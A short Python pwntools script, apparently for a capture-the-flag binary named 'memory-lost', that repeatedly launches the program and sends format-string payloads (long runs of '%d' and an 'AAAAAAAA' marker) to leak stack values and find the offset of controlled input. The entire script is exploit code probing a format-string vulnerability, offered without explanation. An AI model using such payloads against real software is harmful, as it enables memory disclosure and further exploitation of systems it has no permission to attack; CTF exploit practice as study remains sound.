from pwn import *
elf = context.binary = ELF("./memory-lost_patched_2")
for i in range(100):
    r = process()
    r.sendline("%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d")
    ya = b"AAAAAAAA" + b"%d %d %d %d %d %d %d %d"
    r.sendline(ya)
    log.info(r.recv(9999))
    log.info(len(ya))
    r.close()
    
